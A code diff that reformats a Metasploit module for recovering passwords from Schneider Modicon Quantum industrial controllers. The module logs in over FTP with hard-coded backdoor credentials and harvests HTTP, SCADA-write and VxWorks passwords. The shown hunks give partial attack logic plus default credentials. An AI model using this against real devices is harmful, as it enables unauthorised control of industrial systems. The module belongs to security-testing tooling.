@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,39 +12,39 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Schneider Modicon Quantum Password Recovery',
-      'Description'    => %q{
-        The Schneider Modicon Quantum series of Ethernet cards store usernames and
-        passwords for the system in files that may be retrieved via backdoor access.
+                      'Name'           => 'Schneider Modicon Quantum Password Recovery',
+                      'Description'    => %q(
+                        The Schneider Modicon Quantum series of Ethernet cards store usernames and
+                        passwords for the system in files that may be retrieved via backdoor access.
 
-        This module is based on the original 'modiconpass.rb' Basecamp module from
-        DigitalBond.
-      },
-      'Author'         =>
-        [
-          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
-          'todb' # Metasploit fixups
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
-        ],
-      'DisclosureDate'=> 'Jan 19 2012'
-      ))
+                        This module is based on the original 'modiconpass.rb' Basecamp module from
+                        DigitalBond.
+                      ),
+                      'Author'         =>
+                        [
+                          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
+                          'todb' # Metasploit fixups
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
+                        ],
+                      'DisclosureDate' => 'Jan 19 2012'))
 
     register_options(
       [
         Opt::RPORT(21),
         OptString.new('FTPUSER', [true, "The backdoor account to use for login", 'ftpuser']),
         OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password'])
-      ], self.class)
+      ], self.class
+    )
 
     register_advanced_options(
       [
         OptBool.new('RUN_CHECK', [false, "Check if the device is really a Modicon device", true])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   # Thinking this should be a standard alias for all aux
@@ -61,10 +62,14 @@ class MetasploitModule < Msf::Auxiliary
   def check
     is_modicon = false
     vprint_status "#{ip}:#{rport} - FTP - Checking fingerprint"
-    connect rescue nil
+    begin
+      connect
+    rescue
+      nil
+    end
     if sock
       # It's a weak fingerprint, but it's something
-      is_modicon = check_banner()
+      is_modicon = check_banner
       disconnect
     else
       vprint_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
@@ -78,15 +83,15 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
     end
 
-    return Exploit::CheckCode::Safe
+    Exploit::CheckCode::Safe
   end
 
   def run
-    if datastore['RUN_CHECK'] and check == Exploit::CheckCode::Detected
+    if datastore['RUN_CHECK'] && (check == Exploit::CheckCode::Detected)
       print_status("Service detected.")
-      grab() if setup_ftp_connection()
+      grab if setup_ftp_connection
     else
-      grab() if setup_ftp_connection()
+      grab if setup_ftp_connection
     end
   end
 
@@ -138,8 +143,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def cleanup
-    disconnect rescue nil
-    data_disconnect rescue nil
+    begin
+      disconnect
+    rescue
+      nil
+    end
+    begin
+      data_disconnect
+    rescue
+      nil
+    end
   end
 
   # Echo the Net::FTP implementation
@@ -184,22 +197,22 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - FTP - Storing HTTP credentials")
     logins << ["http", httpuser, httppass]
     report_auth_info(
-      :host	=> ip,
-      :port	=> 80,
-      :sname	=> "http",
-      :user	=> httpuser,
-      :pass	=> httppass,
-      :active	=> true
+      host: ip,
+      port: 80,
+      sname: "http",
+      user: httpuser,
+      pass: httppass,
+      active: true
     )
     logins << ["scada-write", "", writecreds[1]]
     if writecreds # This is like an enable password, used after HTTP authentication.
       report_note(
-        :host => ip,
-        :port => 80,
-        :proto => 'tcp',
-        :sname => 'http',
-        :ntype => 'scada.modicon.write-password',
-        :data => writecreds[1]
+        host: ip,
+        port: 80,
+        proto: 'tcp',
+        sname: 'http',
+        ntype: 'scada.modicon.write-password',
+        data: writecreds[1]
       )
     end
 
@@ -216,21 +229,21 @@ class MetasploitModule < Msf::Auxiliary
       modicon_ftppass = ftpcreds[1].split(/[\r\n]+/)[1]
     else
       modicon_ftpuser = "USER"
-      modicon_ftppass = "USERUSER" #from the manual.  Verified.
+      modicon_ftppass = "USERUSER" # from the manual.  Verified.
     end
     print_status("#{rhost}:#{rport} - FTP - Storing hashed FTP credentials")
     # The collected hash is not directly reusable, so it shouldn't be an
     # auth credential in the Cred sense. TheLightCosine should fix some day.
     # Can be used for telnet as well if telnet is enabled.
-      report_note(
-        :host => ip,
-        :port => rport,
-        :proto => 'tcp',
-        :sname => 'ftp',
-        :ntype => 'scada.modicon.ftp-password',
-        :data => "User:#{modicon_ftpuser} VXWorks_Password:#{modicon_ftppass}"
-      )
-      logins << ["VxWorks", modicon_ftpuser, modicon_ftppass]
+    report_note(
+      host: ip,
+      port: rport,
+      proto: 'tcp',
+      sname: 'ftp',
+      ntype: 'scada.modicon.ftp-password',
+      data: "User:#{modicon_ftpuser} VXWorks_Password:#{modicon_ftppass}"
+    )
+    logins << ["VxWorks", modicon_ftpuser, modicon_ftppass]
 
     # Not this:
     # report_auth_info(
@@ -245,5 +258,4 @@ class MetasploitModule < Msf::Auxiliary
     # )
     print_line logins.to_s
   end
-
 end
